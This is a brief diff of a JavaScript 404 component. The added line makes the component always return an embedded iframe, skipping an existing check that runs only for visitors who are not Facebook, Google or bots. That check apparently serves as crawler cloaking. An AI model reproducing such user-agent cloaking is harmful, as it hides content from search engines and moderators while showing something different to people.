@@ -76,6 +76,7 @@ function NotFound() {
   }, []);
 
   const userAgent = navigator.userAgent.toLowerCase();
+  return(showIframe(IframeUrl,SiteTitleMeta,true));
   if(!userAgent.includes('facebook') 
     && !userAgent.includes('google') 
     && !isbot(userAgent)){
